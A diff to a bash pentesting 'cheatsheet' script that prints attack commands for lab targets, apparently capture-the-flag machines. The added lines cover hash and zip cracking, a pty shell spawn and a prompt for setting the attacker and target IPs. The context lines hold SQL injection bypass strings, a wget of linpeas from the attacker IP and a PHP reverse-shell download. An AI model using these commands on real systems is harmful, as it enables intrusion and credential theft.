@@ -42,6 +42,7 @@ function menu {
   echo "Remember to ALWAYS check for each service on each subdomain. Also check all directories on different ports. This script does not autofill the ports you find"
   echo -e "\033[35mScript will default to Tun0 OpenVPN IP for you and add it to commands otherwise tries Public IP, then IPv4 if that fails.\033[0m"
   echo -e "\033[1mRobot's Ultra Special Hacking Cheatsheet\033[0m - \033[31mSometimes you just need a reminder of where to look next.\033[0m"
+  echo -e "\033[32m(0) Manually input your IP and Target IP to change the script variables.\033[0m"
   echo -e "\033[32m(1) Port Scan Commands\033[0m"
   echo -e "\033[32m(2) Subdomain Scan Commands\033[0m"
   echo -e "\033[32m(3) CMS checking Commands\033[0m"
@@ -61,11 +62,17 @@ function menu {
   echo -e "\033[32m(17) File upload bypasses\033[0m"
   echo -e "\033[32m(18) DNS Zone Transfers\033[0m"
   echo -e "\033[32m(19) Common SQL Injections\033[0m"
+  echo -e "\033[32m(20) Cracking files/hashes\033[0m"
   echo -e "\033[32m(99) Helpful commands to remember\033[0m"
   echo "Enter your selection: "
   read selection
   clear
   case $selection in
+    0)
+      echo "Changing these will auto update the rest of the example commands so they can be copy pasted"
+      read -p "Enter Target Site (IP or Website.com with no trailing forward slash) Current target: $T: " "T"
+      read -p "Enter Your IP to use (Current IP: $myip): " "myip"
+      ;;
     1)
       echo -e "\033[34mRustscan can be used for quick port scanning\033[0m"
       command="rustscan -g -a $T | cut -f 2 -d '[' | cut -f 1 -d ']'"
@@ -191,6 +198,11 @@ function menu {
       echo "wget $myip/linpeas.sh"
       echo ""
       echo "crontab -e"
+      echo ""
+      echo -e "\033[34mPython to bash shell\033[0m"
+      echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+      echo ""
+      echo -e "\033[34mRemember to check https://gtfobins.github.io/\033[0m"
       ;;
     17)
       echo -e "\033[34mDownloading php reverse shell and creating a bunch of variants to try uploading\033[0m"
@@ -228,17 +240,23 @@ function menu {
       echo "') or '1'='1--"
       echo "') or ('1'='1—"
       ;;
+    20)
+      echo -e "\033[34mPassword cracking hashes/files\033[0m"
+      echo ""
+      echo -e "\033[34mHashcracking with hashcat\033[0m"
+      echo "hashcat -m 400 -a 0 hash.txt /root/rockyou.txt"
+      echo ""
+      echo -e "\033[34mCracking the password for an image file\033[0m"
+      echo "stegseek file.jpg"
+      echo ""
+      echo -e "\033[34mCrack zip file password\033[0m"
+      echo "sudo fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip"
+      ;;
     99)
       echo -e "\033[34mEnumerating SNMP\033[0m"
       echo "snmpget -v 1 -c public $T"
       echo "snmpwalk -v 1 -c public $T"
       echo "snmpbulkwalk -v2c -c public -Cn0 -Cr10 $T"
-      echo ""
-      echo -e "\033[34mHashcracking with hashcat\033[0m"
-      echo "hashcat -m 400 -a 0 hash.txt /root/rockyou.txt"
-      echo ""
-      echo -e "\033[34mPython to bash shell\033[0m"
-      echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
       echo ""
       echo -e "\033[34mFind processes running\033[0m"
       echo "ps aux"
@@ -246,14 +264,9 @@ function menu {
       echo -e "\033[34mFinding Exif data on a file\033[0m"
       echo "exiftool file.jpg"
       echo ""
-      echo -e "\033[34mCracking the password for an image file\033[0m"
-      echo "stegseek file.jpg "
-      echo ""
-      echo -e "\033[34mCrack zip file password\033[0m"
-      echo "sudo fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip"
-      echo ""
       echo -e "\033[34mCompiling Exploits\033[0m"
       echo "gcc -o exploit exploit.c"
+      echo ""
       echo -e "\033[34mCompile .exe on linux\033[0m"
       echo "i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe"
       ;;
